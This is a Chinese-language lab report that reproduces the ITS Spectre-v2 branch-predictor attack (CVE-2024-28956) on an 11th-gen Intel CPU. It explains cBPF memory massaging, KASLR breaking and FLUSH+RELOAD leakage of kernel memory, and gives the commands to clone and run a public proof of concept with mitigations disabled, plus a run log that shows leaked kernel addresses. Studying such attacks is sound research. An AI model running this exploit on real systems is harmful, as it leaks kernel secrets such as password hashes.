# ITS 实验报告

## 本项目具体说明

ITS（Indirect Target Selection，CVE-2024-28956）展示了Intel 10/11代处理器中分支预测器隔离设计缺陷带来的安全风险，是Spectre-v2漏洞的新型自训练跨域利用变种。本项目详细描述并复现了端到端的利用方式，通过直接到间接分支碰撞技术，突破内核/用户态的域隔离限制，让低权限用户进程诱导内核推测执行恶意代码路径，最终从Linux内核内存中窃取敏感数据（如/etc/shadow密码哈希、内核机密内存）。该项目针对Intel Comet Lake（10代）、Rocket Lake（11代）处理器完成验证，适配Ubuntu 24.04 + Linux 6.8.0-38-generic内核环境。

## 涉及资源

- **Branch Predictor (分支预测器)**
  - **位置**: CPU 内部 (Branch Target Buffer - BTB)
  - **功能**: 预测直接/间接跳转指令的目标地址，BTB存储直接分支信息，IBTB存储间接分支历史相关预测信息，加速CPU流水线执行。
  - **利用**: Intel 10/11代处理器中BTB未对直接/间接分支做严格的类型隔离，攻击者可通过cBPF在核内核空间植入碰撞的直接分支，与内核原有间接分支形成BTB地址碰撞，劫持内核间接分支的推测执行流向。

- **cBPF (经典伯克利包过滤器)**
  - **位置**: Linux内核态（网络过滤/SECCOMP沙箱）
  - **功能**: 轻量级内核沙箱，支持简单的过滤指令和直接分支，被Docker、Chrome等广泛使用，低权限用户可合法加载cBPF过滤器。
  - **利用**: 攻击者滥用cBPF的内存分配特性，通过内存按摩（Memory Massaging） 让cBPF程序分配到与内核受害者间接分支碰撞的地址，植入恶意直接分支作为训练源。

- **Cache (CPU 缓存 / L2/L3 Cache)**
  - **位置**: CPU L2/L3 缓存
  - **功能**: 缓存内存数据，L3 为多核共享，是侧信道攻击的核心传输介质。
  - **利用**: 通过FLUSH+RELOAD侧信道技术，利用缓存访问的时间差异（Hit 快，Miss 慢），将内核推测执行泄露的机密数据编码为缓存状态，在用户态解析还原。

- **KASLR (内核地址空间布局随机化)**
  - **位置**: Linux 内核内存布局
  - **功能**: 随机化内核代码 / 数据的基地址，防止攻击者直接定位内核敏感地址。
  - **利用**: 通过预取侧信道（Prefetch Side-Channel） 破解 KASLR，泄露内核文本基地址、cBPF 模块分配区域地址，为后续地址碰撞做准备。

- **Spectre Gadget (幽灵漏洞利用小工具)**
  - **位置**: Linux 内核文本段
  - **功能**: 内核中天然存在的可被推测执行的指令序列，支持内存加载、地址跳转等操作。
  - **利用**: 劫持内核间接分支推测执行后，跳转到内核中的泄露小工具（Disclosure Gadget） 和调度小工具（Dispatch Gadget），实现内核机密内存的加载和跨域传输。

## 攻击原理

```mermaid
graph TD
    A[Start Attack in User Space] --> B{Step 1: Env Init & Info Leak};
    B -- Prefetch Side-Channel --> C[Break KASLR & Leak Kernel Base];
    C --> D[Leak cBPF Module Allocation Region];
    D --> E{Step 2: cBPF Memory Massaging};
    E -- Allocate Dummy cBPF --> F[Fill Memory Gaps & Force Contiguous Allocation];
    F --> G[Detect 2MB Huge Page Allocation for cBPF];
    G --> H[Locate Colliding Address for Target Kernel Branch];
    H --> I{Step 3: Inject Colliding Direct Branch};
    I -- Craft Malicious cBPF --> J[Allocate cBPF at Colliding Address];
    J --> K[Bypass cBPF Random Offset via Brute-force];
    K --> L{Step 4: Train Kernel Branch Predictor};
    L -- Direct-Indirect Branch Collision --> M[Hijack Victim Indirect Branch Speculative Execution];
    M --> N{Step 5: Secret Leak via Side-Channel};
    N -- Spectre Gadget Chain --> O[Load Kernel Secret in Speculative Execution];
    O --> P[Encode Secret to FLUSH+RELOAD Buffer];
    P --> Q[Parse Cache State in User Space];
    Q --> R[Reconstruct Kernel Secret Data];
```



**核心利用逻辑**:
1.  **碰撞构建**: 攻击者通过 cBPF 在内核中植入与受害者间接分支地址碰撞的直接分支，利用 Intel BTB 的设计缺陷，让内核间接分支的推测执行指向恶意直接分支的目标。
2.  **推测劫持**: 内核执行受害者间接分支时，分支预测器因 BTB 碰撞产生错误预测，推测执行攻击者指定的内核 Gadget 指令序列，该过程不会触发架构级的执行回滚。
3.  **数据编码**: 推测执行过程中，Gadget 加载内核机密数据，并通过访问FLUSH+RELOAD 共享缓冲区的特定偏移，将机密数据值编码为缓存的 Hit/Miss 状态。
4.  **数据解码**：攻击者在用户态遍历访问共享缓冲区，通过计时判断每个偏移的缓存状态，Hit 对应的偏移值即为泄露的机密数据，最终还原完整的内核敏感信息。

## 项目核心代码文件
基于仓库https://github.com/vusec/training-solo的代码结构，核心文件与功能如下：

- **`pocs/its-exploit/`**: ITS 漏洞端到端利用的核心目录，所有实验执行代码均在此处。
    - **`user/main.c`**: 攻击主逻辑，包含 KASLR 破解、cBPF 内存按摩、分支碰撞构建、侧信道数据解析全流程。
    - **`user/cbpf.c`**: cBPF 程序的构造、加载、内存分配管理，实现恶意 cBPF 的注入与地址控制。
    - **`user/flush_and_reload.c`**: FLUSH+RELOAD 侧信道原语实现，提供缓存刷新、访问计时、数据解码功能。
    - **`user/branch_eviction.c`**: 分支预测器操作原语，实现 BTB/IBTB 条目驱逐、分支地址碰撞检测。
    - **`run.sh`**: 实验一键执行脚本，封装编译、架构指定、核心绑定、攻击启动逻辑。
    - **`output.ref`**: 参考输出日志，包含成功泄露时的预期打印结果。
- **`common/`**: 公共工具库，为漏洞利用提供基础能力。
    - **`l2_eviction/evict_l2.c`**: L2 缓存驱逐原语，清理缓存噪声提升侧信道稳定性。
    - **`kaslr_prefetch/kaslr_prefetch.c`**: KASLR 破解原语，通过预取侧信道泄露内核基地址。
    - **`common.h`**: 公共宏定义与函数声明，包含核心绑定、错误处理等基础函数。
- **`analysis/`**: 漏洞分析工具，用于反向工程 CPU 分支预测器行为、验证漏洞利用条件。
- **`test-suite/`**: 漏洞测试套件，用于检测处理器是否存在 ITS 漏洞、验证分支碰撞的可行性。

## 运行环境

- **软件环境**:
  - **语言**: C, Python, Shell
  - **系统**: VMware Virtual Platform Ubuntu 24.04（实验核心运行环境）
  - **Target Kernel**: Linux 6.8.0-38-generic
  - **依赖工具**: build-essential、gcc、make、linux-headers-6.8.0-38-generic、linux-modules-6.8.0-38-generic、msr-tools、pthread

- **硬件版本**:
  - **CPU**: 11th Gen Intel(R) Core(TM) i5-11300H
  - **架构**: x86_64
  - **限制**: 关闭超线程（SMT）、CPU 睿频、irqbalance 服务，减少分支预测器的干扰噪声；绑定实验至单个 CPU 核心执行。

- **启动参数 (Kernel)**:
  - `mitigations=off`: 关闭 Spectre/Meltdown 相关硬件缓解措施，确保 BPRC 漏洞环境存在。
  - `ibpb=off`: 关闭 IBPB（间接分支预测屏障），不刷新间接分支预测器，保留分支预测侧信道攻击条件。 
  - `stibp=off`: 关闭 STIBP（单线程间接分支预测），不阻止超线程之间的分支预测信息泄露，让跨线程侧信道漏洞可利用。 

## 执行步骤

### 配环境步骤
1.  **安装实验依赖**:
    ```bash
    sudo apt update && sudo apt install -y build-essential git gcc make linux-headers-6.8.0-38-generic linux-image-6.8.0-38-generic linux-modules-6.8.0-38-generic msr-tools
    ```
2.  **克隆实验仓库**:
    拉取 ITS 漏洞的官方实验代码仓库:
    ```bash
    git clone https://github.com/vusec/training-solo.git && cd training-solo/pocs/its-exploit
    ```

### 运行步骤
1.  **执行 ITS 漏洞验证实验**:
    ```bash
    sudo ARCH=INTEL_11_GEN ./run.sh -p leak_dummy
    ```


### 预期效果

**运行日志示例**:

```text
yc@yc-VMware-Virtual-Platform:~/cve/training-solo-main/pocs/its-exploit$ sudo ARCH=INTEL_11_GEN ./run.sh leak_dummy
gcc -lm -o main main.c flush_and_reload.c cbpf.c branch_eviction.c collide_branch.c ../../../common/l2_eviction/evict_l2.c ../../../common/kaslr_prefetch/kaslr_prefetch.c -g -O3 -Wno-unused-function -lrt -lm -no-pie -lpthread -DINTEL_11_GEN
Leaking a dummy secret
================== ENVIRONMENT INFO ===================
Model name: 11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz
Linux version: 6.8.0-38-generic
Linux spectre_v2 mitigation info:
- IBPB: disabled; STIBP: disabled; PBRSB-eIBRS: Not affected; BHI: Vulnerable
Skip core pinning for VMware (only 1 core available)
======== Initialize KASLR Prefetch Side-Channel =======
           | min |  q1 | med |  q3 | max
  overhead |  43 | 111 | 117 | 122 | 192
    mapped |  47 | 113 | 121 | 140 | 844
  unmapped |  57 | 316 | 344 | 388 | 150701
Threshold: 98, accuracy:
            hit| mis
    mapped    0| 100
  unmapped    0| 100
======================== Setup ========================
    Direct Map Start: 0xffff886080000000
   Kernel Text Start: 0xffffffff93000000
       Victim Branch: 0xffffffff936df09b
  Speculation Target: 0xffffffff936df125
         Leak gadget: 0xffffffff932acd97
MMAP hook (to evict): 0xffffffff94d49540
hook entry(to evict): 0xffffffff94d490f0
         Base Offset:                0x8
Total number of BPF instructions for page_size filter: 444
------------------------------------------------------
[-] Old last mapped module region: 0xffffffffc09dc000
[+] Filling up gaps...
[+] Reserved in total 512 pages
[-] New last mapped module region: 0xffffffffc0bdd000
--> We insert 4k programs until a new 2MB chunk is allocated
[-] New last mapped module region: 0xffffffffc0bdf000
[+] Reserved in total 1 pages (Size 4K) before new 2MB chunk was allocated
--> Next program will be allocated at 0xffffffffc09e0000
------------------------------------------------------
Selected colliding training addresses:
      VICTIM PC: 0xffffffff936df09b TAG: 0x224 SET: 0x184 OFFSET: 0x1b
      TRAIN  PC: 0xffffffffc17970a4 TAG: 0x224 SET: 0x185 OFFSET: 0x24
   TRAIN TARGET: 0xffffffffc1797125
------------------------------------------------------
[-] Offset between last mapped module and target: 14381220B (3511 Pages or 6 * 2 MB)
Reserving 6 huge_pages...
[+] Reserved in total 3072 pages
[-] Current last mapped module region: 0xffffffffc17d0000
--> Next program will be allocated at 0xffffffffc15d1000
[-] Offset between last mapped module and target: 1859748B (454 Pages or 0 * 2 MB)
--> We reserve the last pages upto or target, but we should stay in the same 2MB page...
[+] Reserved in total 454 pages
[-] Current last mapped module region: 0xffffffffc17e6000
--> Next cBPF program will be placed at 0xffffffffc17ad000 (Colliding address)
--> Offset to train address: 0xfffffffffffea0a4. Hole between train branch and train target: 0x81
   branch_evict: 1003936df09b (tag: 0x224, set: 0x184)
```


### 参考资料
# 1.https://ieeexplore.ieee.org/document/11023266
# 2.https://github.com/vusec/training-solo